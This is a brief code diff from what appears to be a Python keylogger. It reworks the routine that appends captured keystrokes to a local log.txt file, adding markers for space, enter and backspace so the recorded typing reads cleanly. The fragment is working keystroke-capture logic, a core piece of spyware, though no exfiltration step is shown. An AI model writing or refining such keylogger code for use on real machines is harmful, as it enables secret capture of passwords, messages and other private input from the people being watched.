@@ -12,9 +12,16 @@ def write_file(keys):
     keys = str(keys)
     keys = (keys).replace("'","")
     findOthers = keys.find("Key")
-    if findOthers == -1:
-        with open("log.txt","a") as file:
+    with open("log.txt","a") as file:
+        if findOthers == -1:
             file.write(keys)
+        if keys.find("space") != -1:
+            file.write("<space>")
+        if keys.find("enter") != -1:
+            file.write("\n")
+        if keys.find("backspace") != -1:
+            file.write("«")
+
     
 
 def on_release(key):
